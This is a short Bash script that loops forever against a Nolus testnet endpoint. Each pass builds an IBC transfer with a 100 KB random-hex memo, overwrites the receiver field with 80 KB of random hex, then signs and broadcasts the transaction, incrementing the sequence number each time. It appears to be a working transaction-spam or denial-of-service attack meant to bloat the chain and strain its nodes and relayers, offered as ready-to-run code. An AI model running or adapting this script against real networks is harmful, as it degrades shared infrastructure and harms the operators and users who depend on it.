set -ue

while true

do

SEQUENCE=$(curl https://rila-cl.nolus.network:1317/cosmos/auth/v1beta1/accounts/nolus1rv3a4m73jf95erk7n6vghz4j649wyr6r2p56n4 | jq --raw-output ' .account.sequence ')

CHANNEL=channel-0
# CHAIN-ID=rila-1


while true

do

echo "sequence number is $SEQUENCE"

# Make a new transaction body with a random string
nolusd tx ibc-transfer transfer transfer $CHANNEL nolus1rv3a4m73jf95erk7n6vghz4j649wyr6r2p56n4 1unls  --keyring-backend test --memo $(openssl rand -hex 50000) --yes --packet-timeout-timestamp 0 --generate-only --fees 4894unls --gas 1957443 --from nolus1rv3a4m73jf95erk7n6vghz4j649wyr6r2p56n4 &> bareibctx.json
echo "transaction body with padded memo field generated"

# Step 1: Generate the random hex string and save it to a temporary file
openssl rand -hex 40000 > tmp.txt
echo "80kb random string generated (hex times two)"

# Step 2: Use jq with --arg to set the receiver field
jq --rawfile random_str tmp.txt '.body.messages[0].receiver = $random_str' bareibctx.json > autobanana.json
echo "random string inserted"

# Step 3: remove the temporary file afterwards
rm tmp.txt
echo "temporary file removed"

# Step 4: Sign the transaction
nolusd tx sign autobanana.json --chain-id rila-1 --from nolus1rv3a4m73jf95erk7n6vghz4j649wyr6r2p56n4 --yes --sequence $SEQUENCE --keyring-backend test --offline --account-number 1401 &> ban.json
echo "transaction signed"


# Step 5: Broadcast the transaction
nolusd tx broadcast ban.json > banana.log
cat banana.log
echo "transaction broadcasted"

# Step 6: Check for a sequence number mismatch
	if [ $(grep -c "mismatch" banana.log) -eq 1 ]
	then
		echo "sequence number mismatch"
		break
	fi

# iterate sequence number
SEQUENCE=$(($SEQUENCE+1))

done

done

echo "if you're running it right the script just restarted"


